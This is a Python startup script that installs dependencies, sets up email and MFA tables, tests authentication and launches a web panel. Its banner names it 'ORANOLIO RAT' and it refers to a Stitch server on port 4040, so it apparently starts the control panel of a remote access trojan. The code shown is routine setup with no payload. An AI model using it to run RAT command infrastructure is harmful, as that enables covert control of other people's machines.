#!/usr/bin/env python3
"""
Fixed System Startup Script
Handles all dependencies, database setup, and system startup
"""

import os
import sys
import subprocess
import time
import signal
from pathlib import Path

def install_dependencies():
    """Install all required Python dependencies"""
    print("🔧 Installing dependencies...")
    
    dependencies = [
        'flask', 'flask-socketio', 'flask-limiter', 'flask-wtf', 'werkzeug',
        'pycryptodome', 'colorama', 'qrcode', 'pillow', 'pyotp', 
        'cryptography', 'requests', 'python-dotenv', 'psutil'
    ]
    
    for dep in dependencies:
        try:
            subprocess.run([sys.executable, '-m', 'pip', 'install', dep], 
                         check=True, capture_output=True)
            print(f"   ✅ {dep}")
        except subprocess.CalledProcessError:
            print(f"   ⚠️  {dep} (may already be installed)")

def setup_database():
    """Setup database tables"""
    print("🗄️  Setting up database...")
    
    try:
        # Create email tables
        subprocess.run([sys.executable, 'create_email_tables.py'], check=True)
        print("   ✅ Email authentication tables created")
        
        # Create MFA tables
        subprocess.run([sys.executable, 'create_mfa_tables.py'], check=True)
        print("   ✅ MFA tables created")
        
    except subprocess.CalledProcessError as e:
        print(f"   ❌ Database setup failed: {e}")
        return False
    
    return True

def start_web_server():
    """Start the web server"""
    print("🚀 Starting web server...")
    
    try:
        # Start web server in background
        process = subprocess.Popen([sys.executable, 'web_app_real.py'])
        print("   ✅ Web server started")
        print("   📱 Web Interface: http://localhost:5000")
        print("   🔌 Stitch Server: localhost:4040")
        return process
    except Exception as e:
        print(f"   ❌ Failed to start web server: {e}")
        return None

def test_authentication():
    """Test the authentication flow"""
    print("🧪 Testing authentication flow...")
    
    try:
        result = subprocess.run([sys.executable, 'test_auth_flow.py'], 
                              capture_output=True, text=True)
        if result.returncode == 0:
            print("   ✅ Authentication flow working")
            return True
        else:
            print(f"   ❌ Authentication test failed: {result.stderr}")
            return False
    except Exception as e:
        print(f"   ❌ Authentication test error: {e}")
        return False

def main():
    """Main startup function"""
    print("=" * 60)
    print("🚀 ORANOLIO RAT - SYSTEM STARTUP")
    print("=" * 60)
    
    # Change to workspace directory
    os.chdir('/workspace')
    
    # Step 1: Install dependencies
    install_dependencies()
    print()
    
    # Step 2: Setup database
    if not setup_database():
        print("❌ Database setup failed. Exiting.")
        return
    print()
    
    # Step 3: Test authentication
    if not test_authentication():
        print("❌ Authentication test failed. Exiting.")
        return
    print()
    
    # Step 4: Start web server
    web_process = start_web_server()
    if not web_process:
        print("❌ Failed to start web server. Exiting.")
        return
    print()
    
    print("=" * 60)
    print("✅ SYSTEM READY!")
    print("=" * 60)
    print("📱 Web Interface: http://localhost:5000")
    print("🔌 Stitch Server: localhost:4040")
    print("📧 Test Email: brooketogo98@gmail.com")
    print()
    print("🔐 LOGIN PROCESS:")
    print("1. Visit: http://localhost:5000")
    print("2. Enter: brooketogo98@gmail.com")
    print("3. Check webhook URL for verification code")
    print("4. Enter code to complete login")
    print()
    print("⚠️  Press Ctrl+C to stop the server")
    print("=" * 60)
    
    try:
        # Keep the server running
        web_process.wait()
    except KeyboardInterrupt:
        print("\n🛑 Shutting down...")
        web_process.terminate()
        web_process.wait()
        print("✅ Server stopped")

if __name__ == '__main__':
    main()